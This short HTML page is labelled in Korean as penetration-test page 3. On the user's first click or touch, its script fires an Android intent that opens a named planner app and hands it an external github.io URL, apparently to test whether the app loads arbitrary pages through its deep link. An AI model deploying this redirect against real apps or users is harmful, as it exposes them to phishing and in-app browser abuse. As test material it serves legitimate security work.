<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>모의해킹 테스트</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 20px;
        }
        h1 { color: #333; }
    </style>
</head>
<body>
    <h1>모의해킹 테스트용 페이지3</h1>

    <script>
        function openApp() {
            var target = "https://fpdh0104.github.io/testhub/test1.html";
            window.location = "intent://app?url=" + encodeURIComponent(target)
                + "#Intent;scheme=bmplanner;package=kr.co.bomapp.planner;end";
        }
        // 화면 첫 터치/클릭에서 바로 실행
        document.addEventListener('click', openApp, { once: true });
        document.addEventListener('touchstart', openApp, { once: true });
    </script>
</body>
</html>
